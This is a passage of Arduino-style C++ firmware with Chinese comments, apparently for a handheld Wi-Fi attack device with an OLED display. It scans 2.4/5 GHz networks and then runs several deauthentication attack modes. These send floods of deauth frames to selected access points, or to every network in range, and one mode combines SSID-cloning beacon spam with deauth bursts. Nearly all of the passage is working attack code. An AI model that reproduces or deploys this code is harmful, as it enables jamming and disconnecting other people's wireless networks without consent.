            display.setCursor(textX, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
            display.setTextColor(SSD1306_WHITE);
            display.print(renderText);
          }
        }
      }
      
      // 显示信道类型
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(110, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");
      
      display.setTextColor(SSD1306_WHITE);
    }
    
    // 滚动条已移除
    display.display();
  }
}
void drawscan() {
  Serial.println("=== 开始WiFi网络扫描 ===");
  const unsigned long SCAN_TIMEOUT_MS = 2500;
  performScanWithUI("扫描中...", SCAN_TIMEOUT_MS, -1);
}

// 深度扫描：多种扫描方式发现更多有效SSID
void drawDeepScan() {
  Serial.println("=== 开始WiFi网络深度扫描 ===");
  performAdvancedDeepScan();
}

// 高级深度扫描：使用多种扫描策略
void performAdvancedDeepScan() {
  while (true) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);

    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    int titleW = u8g2_for_adafruit_gfx.getUTF8Width("深度扫描中...");
    int titleX = (display.width() - titleW) / 2;
    u8g2_for_adafruit_gfx.setCursor(titleX, 24);
    u8g2_for_adafruit_gfx.print("深度扫描中...");
    display.display();

    // 清空之前的结果
    scan_results.clear();
    SelectedVector.clear();
    g_scanDone = false;
    
    // 存储所有扫描结果的集合，用于去重
    std::set<String> uniqueSSIDs;
    std::vector<WiFiScanResult> allResults;
    
    // 扫描策略1：标准扫描（快速）
    Serial.println("=== 策略1: 标准扫描 ===");
    updateScanProgress(1, 3, "标准扫描");
    performSingleScan("标准扫描", 4000, allResults, uniqueSSIDs);
    
    // 扫描策略2：按信道逐个扫描（2.4G + 5G频段）
    Serial.println("=== 策略2: 多频段扫描 ===");
    updateScanProgress(2, 3, "多频段扫描");
    performChannelWiseScan(allResults, uniqueSSIDs);
    
    // 扫描策略3：深度隐藏网络扫描
    Serial.println("=== 策略3: 隐藏网络扫描 ===");
    updateScanProgress(3, 3, "隐藏网络扫描");
    performHiddenNetworkScan(allResults, uniqueSSIDs);
    
    // 合并所有结果到scan_results
    scan_results = allResults;
    
    // 智能排序：按信号强度排序，强信号优先
    std::sort(scan_results.begin(), scan_results.end(), 
              [](const WiFiScanResult& a, const WiFiScanResult& b) {
                return a.rssi > b.rssi; // 降序排列
              });
    
    // 过滤掉信号太弱的网络（RSSI < -90dBm）
    scan_results.erase(
      std::remove_if(scan_results.begin(), scan_results.end(),
                    [](const WiFiScanResult& result) {
                      return result.rssi < -90;
                    }),
      scan_results.end());
    
    // 限制结果数量为100个（比原来的50个更多）
    if (scan_results.size() > 100) {
      scan_results.resize(100);
    }
    
    selectedFlags.assign(scan_results.size(), 0);
    
    Serial.println("深度扫描完成，发现 " + String(scan_results.size()) + " 个网络");
    
    // 显示完成信息
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("完成");
    u8g2_for_adafruit_gfx.setCursor(5, 40);
    u8g2_for_adafruit_gfx.print("发现: " + String(scan_results.size()));
    display.display();
    delay(500);
    
    menustate = 0;
    homeState = 0;
    homeStartIndex = 0;
    break;
  }
}

// 执行单次扫描
void performSingleScan(const char* scanType, unsigned long timeoutMs, 
                      std::vector<WiFiScanResult>& allResults, 
                      std::set<String>& uniqueSSIDs) {
  updateScanDisplay(scanType);
  
  // 清空全局scan_results，确保每次扫描都从干净状态开始
  scan_results.clear();
  g_scanDone = false;
  unsigned long startMs = millis();
  
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    while (!g_scanDone && (millis() - startMs) < timeoutMs) {
      delay(10);
    }
    
    // 将当前扫描结果添加到总结果中（去重）
    for (const auto& result : scan_results) {
      if (uniqueSSIDs.find(result.ssid) == uniqueSSIDs.end()) {
        uniqueSSIDs.insert(result.ssid);
        allResults.push_back(result);
      }
    }
  }
}

// 按信道逐个扫描
void performChannelWiseScan(std::vector<WiFiScanResult>& allResults, 
                           std::set<String>& uniqueSSIDs) {
  // 2.4G频段常用信道 + 5G频段常用信道
  // 5G频段信道说明：
  // - 36-48: 5.18-5.24 GHz (UNII-1)
  // - 52-64: 5.26-5.32 GHz (UNII-2A) 
  // - 100-140: 5.5-5.7 GHz (UNII-2C)
  // - 149-165: 5.745-5.825 GHz (UNII-3)
  int channels[] = {
    // 2.4G频段 - 优先扫描
    1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 14, 5, 10,
    // 5G频段 - 低频段 (5.18-5.24 GHz)
    36, 40, 44, 48,
    // 5G频段 - 中频段 (5.26-5.32 GHz) 
    52, 56, 60, 64,
    // 5G频段 - 高频段 (5.5-5.7 GHz)
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
    // 5G频段 - 最高频段 (5.745-5.825 GHz)
    149, 153, 157, 161, 165
  };
  int numChannels = sizeof(channels) / sizeof(channels[0]);
  
  for (int i = 0; i < numChannels; i++) {
    int channel = channels[i];
    String scanType = "信道" + String(channel);
    updateScanDisplay(scanType.c_str());
    
    // 设置信道
    wext_set_channel(WLAN0_NAME, channel);
    delay(150);
    
    // 根据频段设置不同的扫描时间
    int scanTime;
    if (channel == 1 || channel == 6 || channel == 11) {
      // 2.4G常用信道
      scanTime = 3000;
    } else if (channel >= 36 && channel <= 64) {
      // 5G低频段
      scanTime = 2500;
    } else if (channel >= 100 && channel <= 140) {
      // 5G中频段
      scanTime = 2500;
    } else if (channel >= 149 && channel <= 165) {
      // 5G高频段
      scanTime = 2500;
    } else {
      // 其他2.4G信道
      scanTime = 2000;
    }
    
    performSingleScan(scanType.c_str(), scanTime, allResults, uniqueSSIDs);
    delay(300);
  }
}


// 隐藏网络扫描
void performHiddenNetworkScan(std::vector<WiFiScanResult>& allResults, 
                            std::set<String>& uniqueSSIDs) {
  // 在主要信道上进行长时间扫描，专门寻找隐藏网络
  // 包括2.4G和5G频段的主要信道
  int hiddenChannels[] = {
    // 2.4G频段主要信道
    1, 6, 11, 2, 7, 12,
    // 5G频段主要信道
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
    149, 153, 157, 161, 165
  };
  int numChannels = sizeof(hiddenChannels) / sizeof(hiddenChannels[0]);
  
  for (int i = 0; i < numChannels; i++) {
    int channel = hiddenChannels[i];
    String scanType = "隐藏" + String(channel);
    updateScanDisplay(scanType.c_str());
    
    wext_set_channel(WLAN0_NAME, channel);
    delay(200);
    
    // 隐藏网络需要更长的扫描时间
    int scanTime = (channel >= 36) ? 2500 : 3000; // 5G信道稍短，2.4G信道更长
    performSingleScan(scanType.c_str(), scanTime, allResults, uniqueSSIDs);
    delay(300);
  }
}

// 更新扫描进度显示
void updateScanProgress(int current, int total, const char* strategy) {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 显示标题
  int titleW = u8g2_for_adafruit_gfx.getUTF8Width("深度扫描中...");
  int titleX = (display.width() - titleW) / 2;
  u8g2_for_adafruit_gfx.setCursor(titleX, 10);
  u8g2_for_adafruit_gfx.print("深度扫描中...");
  
  // 显示进度
  String progress = "进度: " + String(current) + "/" + String(total);
  int progressW = u8g2_for_adafruit_gfx.getUTF8Width(progress.c_str());
  int progressX = (display.width() - progressW) / 2;
  u8g2_for_adafruit_gfx.setCursor(progressX, 25);
  u8g2_for_adafruit_gfx.print(progress);
  
  // 显示当前策略
  int strategyW = u8g2_for_adafruit_gfx.getUTF8Width(strategy);
  int strategyX = (display.width() - strategyW) / 2;
  u8g2_for_adafruit_gfx.setCursor(strategyX, 40);
  u8g2_for_adafruit_gfx.print(strategy);
  
  // 显示进度条
  int barWidth = 100;
  int barHeight = 4;
  int barX = (display.width() - barWidth) / 2;
  int barY = 50;
  
  // 背景条
  display.drawRect(barX, barY, barWidth, barHeight, SSD1306_WHITE);
  
  // 进度条
  int fillWidth = (barWidth * current) / total;
  display.fillRect(barX, barY, fillWidth, barHeight, SSD1306_WHITE);
  
  display.display();
}

// 更新扫描显示
void updateScanDisplay(const char* scanType) {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  int titleW = u8g2_for_adafruit_gfx.getUTF8Width("深度扫描中...");
  int titleX = (display.width() - titleW) / 2;
  u8g2_for_adafruit_gfx.setCursor(titleX, 15);
  u8g2_for_adafruit_gfx.print("深度扫描中...");
  
  int typeW = u8g2_for_adafruit_gfx.getUTF8Width(scanType);
  int typeX = (display.width() - typeW) / 2;
  u8g2_for_adafruit_gfx.setCursor(typeX, 35);
  u8g2_for_adafruit_gfx.print(scanType);
  
  // 显示进度动画
  static int animFrame = 0;
  const char* frames[4] = {"|", "/", "-", "\\"};
  u8g2_for_adafruit_gfx.setCursor(display.width() - 20, 50);
  u8g2_for_adafruit_gfx.print(frames[animFrame % 4]);
  animFrame++;
  
  display.display();
}
void Single() {
  Serial.println("=== 启动单一攻击 ===");
  Serial.println("攻击模式: 单一攻击");
  Serial.println("攻击强度: " + String(perdeauth));
  
  showAttackStatusPage("单一攻击中");
  
  // LED控制：红灯闪烁
  startAttackLED();

  int packetCount = 0;
  
  while (true) {
    // 更新攻击状态显示
    showAttackStatusPage("单一攻击中");
    
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 显示确认弹窗
      if (showConfirmModal("确认停止攻击")) {
        return; // 确认停止攻击
      }
      // 取消则继续攻击，重新启动LED
      startAttackLED();
    }
    
    if (SelectedVector.empty()) {
      // 单目标：直接对当前高亮网络进行burst发送
      wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
      sendDeauthBurstToBssid(scan_results[scrollindex].bssid, perdeauth, packetCount, 0);
      if (packetCount >= 1000) {
        digitalWrite(LED_R, HIGH);
        delay(50);
        digitalWrite(LED_R, LOW);
        packetCount = 0;
      }
    } else {
      // 多目标：按信道分组，减少频繁切换信道（复用缓存）
      channelBucketsCache.clearBuckets();
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
          channelBucketsCache.add(scan_results[selectedIndex].channel,
                                  scan_results[selectedIndex].bssid);
        }
      }
      const unsigned int interFrameDelayUs = 250; // 微秒级细微延时
      for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
        if (channelBucketsCache.buckets[chIdx].empty()) continue;
        wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
        for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
          if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
            digitalWrite(LED_R, LOW);
            digitalWrite(LED_G, LOW);
            digitalWrite(LED_B, LOW);
            delay(200);
            // 显示确认弹窗
            if (showConfirmModal("确认停止攻击")) {
              return; // 确认停止攻击
            }
            // 取消则继续攻击，重新启动LED
            startAttackLED();
          }
          sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
          if (packetCount >= 1000) {
            digitalWrite(LED_R, HIGH);
            delay(50);
            digitalWrite(LED_R, LOW);
            packetCount = 0;
          }
        }
      }
      // 处理未在 allChannels 中的信道
      for (const auto &eb : channelBucketsCache.extras) {
        if (eb.bssids.empty()) continue;
        wext_set_channel(WLAN0_NAME, eb.channel);
        for (const uint8_t *bssidPtr : eb.bssids) {
          if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
            digitalWrite(LED_R, LOW);
            digitalWrite(LED_G, LOW);
            digitalWrite(LED_B, LOW);
            delay(200);
            // 显示确认弹窗
            if (showConfirmModal("确认停止攻击")) {
              return; // 确认停止攻击
            }
            // 取消则继续攻击，重新启动LED
            startAttackLED();
          }
          sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
          if (packetCount >= 1000) {
            digitalWrite(LED_R, HIGH);
            delay(50);
            digitalWrite(LED_R, LOW);
            packetCount = 0;
          }
        }
      }
    }
  }
}

void Multi() {
  Serial.println("=== 启动多重攻击 ===");
  Serial.println("攻击模式: 多重攻击");
  Serial.println("攻击强度: " + String(perdeauth));
  
  showAttackStatusPage("多重攻击中");
  
  // LED控制：红灯闪烁
  startAttackLED();
  
  int packetCount = 0;
  while (true) {

    // 更新攻击状态显示
    showAttackStatusPage("多重攻击中");

    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 显示确认弹窗
      if (showConfirmModal("确认停止攻击")) {
        return; // 确认停止攻击
      }
      // 取消则继续攻击，重新启动LED
      startAttackLED();
    }
    if (SelectedVector.empty()) {
      // 如果没有目标，稍作等待避免空转
      delay(50);
      continue;
    }
    // 按信道分组，减少频繁切换信道
    channelBucketsCache.clearBuckets();
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
        channelBucketsCache.add(scan_results[selectedIndex].channel,
                                scan_results[selectedIndex].bssid);
      }
    }
    const unsigned int interFrameDelayUs = 250; // 微秒级细微延时
    for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
      if (channelBucketsCache.buckets[chIdx].empty()) continue;
      wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
      for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
          delay(200);
          // 显示确认弹窗
          if (showConfirmModal("确认停止攻击")) {
            return; // 确认停止攻击
          }
          // 取消则继续攻击，重新启动LED
          startAttackLED();
        }
        // 使用微秒级 burst（标准原因序列），减少调用开销并提升效率
        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
        if (packetCount >= 200) {
          digitalWrite(LED_R, HIGH);
          delay(30);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
        }
      }
    }
    // 处理未在 allChannels 中的信道
    for (const auto &eb : channelBucketsCache.extras) {
      if (eb.bssids.empty()) continue;
      wext_set_channel(WLAN0_NAME, eb.channel);
      for (const uint8_t *bssidPtr : eb.bssids) {
        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
          delay(200);
          // 显示确认弹窗
          if (showConfirmModal("确认停止攻击")) {
            return; // 确认停止攻击
          }
          // 取消则继续攻击，重新启动LED
          startAttackLED();
        }
        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
        if (packetCount >= 200) {
          digitalWrite(LED_R, HIGH);
          delay(30);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
        }
      }
    }
    delay(10);
  }
}
void updateSmartTargets() {
  // 备份当前的扫描结果
  std::vector<WiFiScanResult> backup_results = scan_results;
  
  // 清空当前扫描结果以准备新的扫描
  scan_results.clear();
  
  // 标记所有目标为非活跃
  for (auto& target : smartTargets) {
    target.active = false;
  }

  // 执行新的扫描
  if (scanNetworks() == 0) {  // 扫描成功
    // 更新目标状态
    for (auto& target : smartTargets) {
      for (const auto& result : scan_results) {
        if (memcmp(target.bssid, result.bssid, 6) == 0) {
          target.active = true;
          target.channel = result.channel;
          break;
        }
      }
    }
  } else {  // 扫描失败
    // 恢复之前的扫描结果
    scan_results = std::move(backup_results);
    Serial.println("Scan failed, restored previous results");
  }
}
void AutoSingle() {
  Serial.println("=== 启动自动单一攻击 ===");
  Serial.println("攻击模式: 自动单一攻击");
  Serial.println("攻击强度: " + String(perdeauth));
  
  showAttackStatusPage("自动单一攻击中");
  
  // LED控制：红灯闪烁
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 600;
  unsigned long buttonCheckTime = 0;
  const int buttonCheckInterval = 120; // 检查按钮的间隔
  
  // 初始化目标列表
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    lastScanTime = millis();
  }

  while (true) {
    // 更新攻击状态显示
    showAttackStatusPage("自动单一攻击中");

    unsigned long currentTime = millis();
    
    // LED闪烁控制
    if (currentTime - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = currentTime;
    }

    // 按钮检查（增加检查间隔以减少CPU负载）
    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
        digitalWrite(LED_R, LOW);
        digitalWrite(LED_G, LOW);
        digitalWrite(LED_B, LOW);
        delay(200);
        // 显示确认弹窗
        if (showConfirmModal("确认停止攻击")) {
          return; // 确认停止攻击
        }
        // 取消则继续攻击，重新启动LED
        startAttackLED();
      }
      buttonCheckTime = currentTime;
    }

    // 定期扫描更新（每10分钟）
    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
      std::vector<WiFiScanResult> backup = scan_results; // 备份当前结果
      updateSmartTargets();
      if (scan_results.empty()) {
        scan_results = std::move(backup); // 如果扫描失败，恢复备份
      }
      lastScanTime = currentTime;
    }

    int packetCount = 0;

if (smartTargets.empty()) {
  // 如果没有目标，等待一段时间再继续
  delay(100);
  continue;
}
     // 攻击目标
    for (const auto& target : smartTargets) {
  // 不管是否活跃都进行攻击
  wext_set_channel(WLAN0_NAME, target.channel);
  
  // 使用 burst 版本减少逐帧调用开销
  sendDeauthBurstToBssid(target.bssid, 3, packetCount, 5);
          if (packetCount >= 500) {
          digitalWrite(LED_R, HIGH);
          delay(50);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
        }
    
    // 检查按钮状态
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 显示确认弹窗
      if (showConfirmModal("确认停止攻击")) {
        return; // 确认停止攻击
      }
      // 取消则继续攻击，重新启动LED
      startAttackLED();
    }
  }
    delay(10);
  }
}
void AutoMulti() {
  Serial.println("=== 启动自动多重攻击 ===");
  Serial.println("攻击模式: 自动多重攻击");
  Serial.println("攻击强度: " + String(perdeauth));
  
  showAttackStatusPage("自动多重攻击中");
  
  // LED控制：红灯闪烁
  startAttackLED();
  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 600;
  unsigned long buttonCheckTime = 0;
  const int buttonCheckInterval = 120;
  static size_t currentTargetIndex = 0;
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    lastScanTime = millis();
  }
  while (true) {
    // 更新攻击状态显示
    showAttackStatusPage("自动多重攻击中");

    unsigned long currentTime = millis();
    if (currentTime - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = currentTime;
    }
    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
        digitalWrite(LED_R, LOW);
        digitalWrite(LED_G, LOW);
        digitalWrite(LED_B, LOW);
        delay(200);
        // 显示确认弹窗
        if (showConfirmModal("确认停止攻击")) {
          return; // 确认停止攻击
        }
        // 取消则继续攻击，重新启动LED
        startAttackLED();
      }
      buttonCheckTime = currentTime;
    }
    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
      std::vector<WiFiScanResult> backup = scan_results;
      updateSmartTargets();
      if (scan_results.empty()) {
        scan_results = std::move(backup);
      }
      lastScanTime = currentTime;
    }
    int packetCount = 0;
    if (!smartTargets.empty()) {
      if (currentTargetIndex >= smartTargets.size()) {
        currentTargetIndex = 0;
      }
      const auto& target = smartTargets[currentTargetIndex];
      wext_set_channel(WLAN0_NAME, target.channel);
      sendFixedReasonDeauthBurst(target.bssid, 0, 5, packetCount, 5);
      if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
        digitalWrite(LED_R, HIGH);
        delay(50);
        digitalWrite(LED_R, LOW);
        packetCount = 0;
      }
      currentTargetIndex = (currentTargetIndex + 1) % smartTargets.size();
    }
    // 优化：减少无效延时
    // delay(10); // 可根据实际情况调整或去除
  }
}
void All() {
  Serial.println("=== 启动全频道攻击 ===");
  Serial.println("攻击模式: 全频道攻击");
  Serial.println("攻击强度: " + String(perdeauth));
  
  showAttackStatusPage("全频道攻击中");
  
  // LED控制：红灯闪烁
  startAttackLED();
  
  while (true) {
    // 更新攻击状态显示
    showAttackStatusPage("全频道攻击中");
    
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 显示确认弹窗
      if (showConfirmModal("确认停止攻击")) {
        return; // 确认停止攻击
      }
      // 取消则继续攻击，重新启动LED
      startAttackLED();
    }
    
    // 为所有网络创建目标（如果还没有创建）
    if (smartTargets.empty()) {
      for (size_t i = 0; i < scan_results.size(); i++) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[i].bssid, 6);
        target.channel = scan_results[i].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    
    // 按信道分组，减少频繁切换信道
    channelBucketsCache.clearBuckets();
    for (const auto &t : smartTargets) {
      channelBucketsCache.add(t.channel, t.bssid);
    }
    
    int packetCount = 0;
    for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
      if (channelBucketsCache.buckets[chIdx].empty()) continue;
      wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
      for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
        if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
          delay(200);
          // 显示确认弹窗
          if (showConfirmModal("确认停止攻击")) {
            return; // 确认停止攻击
          }
          // 取消则继续攻击，重新启动LED
          startAttackLED();
        }
        sendDeauthBurstToBssid(bssidPtr, perdeauth, packetCount, 0);
        if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
          digitalWrite(LED_R, HIGH);
          delay(50);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
        }
      }
    }
    // extras信道处理
    for (const auto &eb : channelBucketsCache.extras) {
      if (eb.bssids.empty()) continue;
      wext_set_channel(WLAN0_NAME, eb.channel);
      for (const uint8_t *bssidPtr : eb.bssids) {
        if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
          delay(200);
          // 显示确认弹窗
          if (showConfirmModal("确认停止攻击")) {
            return; // 确认停止攻击
          }
          // 取消则继续攻击，重新启动LED
          startAttackLED();
        }
        sendDeauthBurstToBssid(bssidPtr, perdeauth, packetCount, 0);
        if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
          digitalWrite(LED_R, HIGH);
          delay(50);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
        }
      }
    }
    
    delay(10); // 短暂延时避免CPU过载
  }
}


void BeaconDeauth() {
  Serial.println("=== 启动信标+解除认证攻击 ===");
  Serial.println("攻击模式: 信标+解除认证攻击");
  Serial.println("攻击强度: 10");
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  oledDrawCenteredLine("信标+解除认证攻击中", 25);
  
  // LED控制：红灯闪烁
  startAttackLED();

  unsigned long prevBlink = 0;
  bool redState = true;
  const int blinkInterval = 800;

  // OLED行区域：显示目标SSID，单目标仅显示一次，多目标1s刷新
  const int ssidLineY = 42;
  static unsigned long lastSSIDDrawMs = 0;
  bool singleTargetDrawn = false;

  int packetCount = 0;
  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      // 显示确认弹窗
      if (showConfirmModal("确认停止攻击")) {
        return; // 确认停止攻击
      }
      // 取消则继续攻击，重新启动LED
      startAttackLED();
      // 重新绘制攻击状态页面，避免确认弹窗残留
      display.clearDisplay();
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      oledDrawCenteredLine("信标+解除认证攻击中", 25);
    }

    if (!SelectedVector.empty()) {
      // 单目标：仅绘制一次；多目标：1s刷新
      unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
          String ssid1 = scan_results[selectedIndex].ssid;
          wext_set_channel(WLAN0_NAME, scan_results[selectedIndex].channel);
          
          // 克隆多个BSSID的同名信标
          const int cloneCount = 6;
          uint8_t tempMac[6];
          for (int c = 0; c < cloneCount; c++) {
            generateRandomMAC(tempMac);
            for (int x = 0; x < 10; x++) {
              wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, ssid1.c_str());
            }
          }
          
          // 使用原因码 1/4/16 组合，小批量，帧间隔 5ms
          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 1, 1, packetCount, 5);
          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 4, 1, packetCount, 5);
          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 16, 1, packetCount, 5);
          if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
            digitalWrite(LED_R, HIGH);
            delay(50);
            digitalWrite(LED_R, LOW);
            packetCount = 0;
          }

          // 单目标仅绘制一次；多目标定时刷新
          if (SelectedVector.size() == 1) {
            if (!singleTargetDrawn) {
              oledDrawCenteredLine(ssid1.c_str(), ssidLineY);
              singleTargetDrawn = true;
            }
          } else {
            oledMaybeDrawCenteredLine(ssid1.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
          }
        }
      }
    } else {
      // 如果没有选择特定SSID，攻击所有扫描到的网络（视为多目标，1s刷新）
      const unsigned long intervalMs = 1000UL;
      for (size_t i = 0; i < scan_results.size(); i++) {
        String ssid1 = scan_results[i].ssid;
        wext_set_channel(WLAN0_NAME, scan_results[i].channel);
        
        const int cloneCount = 6;
        uint8_t tempMac[6];
        for (int c = 0; c < cloneCount; c++) {
          generateRandomMAC(tempMac);
          for (int x = 0; x < 10; x++) {
            wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, ssid1.c_str());
          }
        }
        
        // 对齐示例：使用原因码 1/4/16 组合，小批量，帧间隔 5ms
        sendFixedReasonDeauthBurst(scan_results[i].bssid, 1, 1, packetCount, 5);
        sendFixedReasonDeauthBurst(scan_results[i].bssid, 4, 1, packetCount, 5);
        sendFixedReasonDeauthBurst(scan_results[i].bssid, 16, 1, packetCount, 5);
        if (packetCount >= 100) {
          digitalWrite(LED_R, HIGH);
          delay(50);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
        }

        oledMaybeDrawCenteredLine(ssid1.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
      }
    }
  }
}
void generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  // 确保MAC地址符合规范
  mac[0] &= 0xFC; // 清除最低两位
  mac[0] |= 0x02; // 设置为随机静态地址
}

// ===== 信标攻击通用辅助函数 =====
// 生成随机SSID后缀
String generateRandomSuffix() {
  String suffix = "";
  suffix += char('a' + (random(0,26)));
  suffix += char('a' + (random(0,26)));
  return suffix;
}

// 创建带随机后缀的假SSID
String createFakeSSID(const String& originalSSID) {
  return originalSSID + String("(") + generateRandomSuffix() + String(")");
}

// 在指定信道上发送信标帧
void sendBeaconOnChannel(int channel, const char* ssid, int cloneCount, int sendCount, int delayMs = 0) {
  wext_set_channel(WLAN0_NAME, channel);
  for (int c = 0; c < cloneCount; c++) {
    uint8_t tempMac[6];
    generateRandomMAC(tempMac);
    String fakeSsid = createFakeSSID(String(ssid));
    const char *fakeSsidCstr = fakeSsid.c_str();
    
